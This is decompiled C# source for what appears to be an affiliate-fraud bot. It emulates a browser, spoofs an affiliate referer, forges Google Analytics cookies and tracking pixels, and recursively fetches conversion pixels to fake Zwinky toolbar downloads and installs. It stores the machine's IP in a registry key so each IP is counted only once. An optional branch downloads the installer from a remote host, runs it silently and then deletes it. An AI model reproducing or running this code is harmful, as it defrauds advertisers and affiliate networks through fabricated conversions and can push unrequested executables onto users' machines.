using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using HTTPAgent;
using Microsoft.Win32;

namespace AffiliateExecuterNoWin;

internal static class Program
{
	[STAThread]
	private static void Main(string[] args)
	{
		string referer = "http://avataryou.info/toolbar";
		string appName = "ddl7";
		bool flag = false;
		string uRL = "http://lookforpages.com/checkip/index.php";
		bool flag2 = false;
		string text = "ZwinkySetup2.3.67.1.SA.HP.ZJfox000.exe";
		string url = "http://ak.exe.imgfarm.com/images/nocache/funwebproducts/2.3.67.1/" + text;
		DateTime dateTime = new DateTime(3000, 1, 1);
		if (dateTime < DateTime.Now)
		{
			return;
		}
		Agent agent = new Agent();
		agent.EmulateBrowser();
		string uRL2;
		if (flag)
		{
			uRL2 = agent.GetURL(uRL);
			string text2 = DataExtractor.ExtractDataArray(uRL2, "(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)", "$1")[0];
			string savedIPs = GetSavedIPs(appName);
			if (savedIPs.IndexOf(text2) >= 0)
			{
				return;
			}
			SetSavedIPs(appName, savedIPs + text2 + ";");
		}
		agent.Referer = referer;
		uRL2 = agent.GetURL("http://www.mb01.com/lnk.asp?o=1347&c=918273&a=42194");
		string uRL3 = DataExtractor.ExtractDataArray(uRL2, "window.location=\"([^\"]+)", "$1")[0];
		string uRL4 = agent.GetURL(uRL3);
		uRL3 = agent.Referer;
		if (!uRL3.StartsWith("http://www.zwinky.com"))
		{
			return;
		}
		string text3 = DataExtractor.ExtractDataArray(uRL4, "splash/partner/([^\"']+)", "$1")[0];
		addTrackingCookies(agent.cookieJar, "zwinky.com");
		GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "-", uRL3.Replace("http://www.zwinky.com", ""), addutmcn: true);
		GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "", "/clicks/splash/cookie_enabled", addutmcn: false);
		GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "", "/clicks/splash/partner/" + text3, addutmcn: false);
		agent.GetURL("http://www.zwinky.com/dl/install.jhtml");
		GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "-", "/dl/install.jhtml", addutmcn: false);
		GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "", "/clicks/splash/install_ie_sp2_progress", addutmcn: false);
		if (flag2)
		{
			if (Directory.Exists("C:\\Users\\Public\\Documents\\"))
			{
				text = "C:\\Users\\Public\\Documents\\" + text;
			}
			agent.getURL2File(url, text);
			try
			{
				Process process = Process.Start(text);
				process.WaitForExit();
				File.Delete(text);
			}
			catch
			{
			}
		}
		string uRL5 = agent.GetURL("http://www.zwinky.com/dl/success.jhtml");
		string uRL6 = DataExtractor.ExtractDataArray(uRL5, "<script src=\"([^\"]+)", "$1")[0];
		agent.GetURL(uRL6);
		GetTrackingUrl(agent, "Success", "www.zwinky.com", "-", "/dl/success.jhtml", addutmcn: false);
		string uRL7 = agent.GetURL("http://www.zwinky.com/dl/successPixels.jhtml");
		GetTrackingUrl(agent, "Success", "www.zwinky.com", "", "/clicks/settings/checkboxes/sa2_on/hp_on", addutmcn: false);
		GetTrackingUrl(agent, "Success", "www.zwinky.com", "", "/clicks/bartools/download_complete", addutmcn: false);
		GetTrackingUrl(agent, "Success", "www.zwinky.com", "", "/clicks/settings/active_x/u%253D" + randomString(22) + "%2526p%253D" + text3, addutmcn: false);
		GetRecursivePixels(agent, uRL7);
	}

	private static void GetRecursivePixels(Agent agent, string html)
	{
		html = Regex.Replace(html, "<noscript>.*?</noscript>", "");
		List<string> list = new List<string>();
		list.AddRange(DataExtractor.ExtractDataArray(html, "pt src=\" ?([^\"]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<img src=\\\\?\" ?([^\"\\\\]+)", "$1"));
		string referer = agent.Referer;
		foreach (string item in list)
		{
			agent.Referer = referer;
			string uRL = agent.GetURL(item.Trim().Replace("&amp;", "&"));
			GetRecursivePixels(agent, uRL);
		}
	}

	private static string randomString(int len)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		Random random = new Random();
		string text2 = "";
		for (int i = 0; i < len; i++)
		{
			text2 += text[random.Next(text.Length)];
		}
		return text2;
	}

	private static string GetSavedIPs(string appName)
	{
		string result = ";";
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.OpenSubKey("SOFTWARE\\" + appName, writable: false);
			if (currentUser != null)
			{
				result = currentUser.GetValue("ips")!.ToString();
				return result;
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static void SetSavedIPs(string appName, string val)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.OpenSubKey("SOFTWARE\\" + appName, writable: true);
			if (currentUser == null)
			{
				currentUser = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + appName);
			}
			currentUser.SetValue("ips", val);
		}
		catch
		{
		}
	}

	public static void addTrackingCookies(CookieContainer cookies, string domain)
	{
		Random random = new Random();
		Uri uri = new Uri("http://" + domain + "/");
		long num = (long)(DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
		string text = uHash(domain);
		string value = text + "." + random.Next(int.MaxValue) + "." + num + "." + num + "." + num + ".1";
		string value2 = text + "." + num + ".1.1.utmcsr=ZJxdm025|utmccn=(not+set)|utmcmd=(not+set)";
		cookies.Add(uri, createCookie("__utma", value, 1800));
		cookies.Add(uri, createCookie("__utmb", text, 1800));
		cookies.Add(uri, createCookie("__utmc", text, 1800));
		cookies.Add(uri, createCookie("__utmz", value2, 1800));
	}

	public static string uHash(string d)
	{
		int num = 0;
		int num2 = 0;
		for (int num3 = d.Length - 1; num3 >= 0; num3--)
		{
			int num4 = char.Parse(d.Substring(num3, 1));
			num = ((num << 6) & 0xFFFFFFF) + num4 + (num4 << 14);
			if ((num2 = num & 0xFE00000) != 0)
			{
				num ^= num2 >> 21;
			}
		}
		return num.ToString();
	}

	public static Cookie createCookie(string name, string value, int timeout)
	{
		Cookie cookie = new Cookie(name, value);
		cookie.Expires = DateTime.Now.AddSeconds(timeout);
		return cookie;
	}

	public static string GetTrackingUrl(Agent agent, string title, string hostname, string referer, string tracking, bool addutmcn)
	{
		return agent.GetURL(createTrackingUrl(title, hostname, referer, tracking, addutmcn));
	}

	public static string createTrackingUrl(string title, string hostname, string referer, string tracking, bool addutmcn)
	{
		Random random = new Random();
		string text = Screen.get_PrimaryScreen().get_Bounds().Width + "x" + Screen.get_PrimaryScreen().get_Bounds().Height;
		return "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=" + random.Next(int.MaxValue) + "&utmsr=" + text + "&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0" + (addutmcn ? "&utmcn=1" : "") + ((title == "") ? "" : ("&utmdt=" + title)) + "&utmhn=" + hostname + ((referer == "") ? "" : ("&utmr=" + referer)) + "&utmp=" + tracking;
	}
}
